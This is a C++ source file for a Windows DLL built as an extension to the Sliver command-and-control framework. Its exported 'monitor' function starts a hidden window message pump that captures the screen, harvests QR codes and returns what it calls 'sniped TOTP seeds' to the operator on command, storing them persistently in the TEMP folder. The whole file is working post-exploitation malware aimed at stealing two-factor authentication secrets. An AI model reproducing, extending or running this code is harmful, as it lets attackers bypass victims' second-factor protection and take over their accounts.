#define _CRT_SECURE_NO_WARNINGS
#include "WinMsgHandler.h"

// Sliver Extension callback definition
typedef int (__stdcall * goCallback)(const char*, int); // __stdcall needed for WIN32 and golang, ignored in WIN64

//State Tracking Between calls
static bool winPumpRunning = false;
static std::unique_ptr<std::thread> winPump{ nullptr };
static std::shared_ptr<SharedQueue> _queue{ nullptr };
static std::unique_ptr<WinMsgHandler> msg_handler{ nullptr };

static void startWinPump(){
	msg_handler = std::make_unique<WinMsgHandler>(_queue); //Create our window to capture messages
	MSG msg{ 0 };
	
	//AddClipboardFormatListener(msg_handler->wHandle); //Request Clipboard messages
	winPumpRunning = true;
	while (winPumpRunning && GetMessageW(&msg, msg_handler->wHandle, 0, 0)) //Start our message pump
	{
		TranslateMessage(&msg);
		DispatchMessageW(&msg);
	}
	//winPumpRunning = false; // Just in case we exited based on an error in capturing we'll reset running to false here
	//RemoveClipboardFormatListener(msg_handler->wHandle);
	msg_handler.reset(nullptr);
}

static std::string utf8_encode(const std::wstring& wstr)
{
	if (wstr.empty()) return std::string();
	int size_needed = WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), NULL, 0, NULL, NULL);
	std::string strTo(size_needed, 0);
	WideCharToMultiByte(CP_UTF8, 0, &wstr[0], (int)wstr.size(), &strTo[0], size_needed, NULL, NULL);
	return strTo;
}

extern "C" __declspec(dllexport) int __cdecl monitor(char* argsBuffer, uint32_t bufferSize, goCallback callback) {
	int cmd = -1;
	if (bufferSize != 1) {
		std::string msg{ "You must provide a command.\n\t0 = stop\n\t1 = start monitoring screen\n\t2 = get sniped TOTP seeds" };
		callback(msg.c_str(), msg.length());
		return 0;
	}
	else
		cmd = argsBuffer[0] - '0'; // atoi would return 0 if it couldn't convert, this will only return 0 if the first char is 0

	switch (cmd)
	{
		case 0: //stop
			if (!winPumpRunning) {
				std::string msg{ "Currently not QRmoning, can't stop what we havn't started" };
				callback(msg.c_str(), msg.length());
			}
			else{
				SendMessageW(msg_handler->wHandle, WM_CLOSE, NULL, NULL);
				winPumpRunning = false;
				winPump->join();
				winPump.reset();
				_queue.reset();
				std::string msg{ "QRmon stopped" };
				callback(msg.c_str(), msg.length());
			}
			break;
		case 1: // start
			if (winPumpRunning) {
				std::string msg{ "Can't double start QRmon, ignoring" };
				callback(msg.c_str(), msg.length());
			}
			else{
				_queue = std::make_shared<SharedQueue>();
				winPump = std::make_unique<std::thread>(&startWinPump);

				std::string msg{ "QRmon started, "+ std::to_string(MIN_TIME_QR_REST)+" seconds minimum resting beetwen two screengrabs, persistent store in "+ std::getenv("TEMP")+"\\"+ TMP_FILE_NAME };
				callback(msg.c_str(), msg.length());
			}
			break;
		case 2: // get logs
			if (!winPumpRunning) {
				std::string msg{ "QRmon must be running to get its output" };
				callback(msg.c_str(), msg.length());
			}
			else {
				std::wstring results{};
				while (!_queue->empty())
					results += _queue->Pop();

				if (results.length() == 0) {
					std::string msg{ "No new QR codes have been captured" };
					callback(msg.c_str(), msg.length());
				}
				else {
					int utf8Size = WideCharToMultiByte(CP_UTF8, 0, results.c_str(), -1, nullptr, 0, nullptr, nullptr);

					std::string utf8_results = utf8_encode(results);
					callback(utf8_results.c_str(), utf8_results.length());
				}
			}
			break;
		default:{
			std::string msg{ "invalid command received" };
			callback(msg.c_str(), msg.length());
		}
	}

	return 0;
}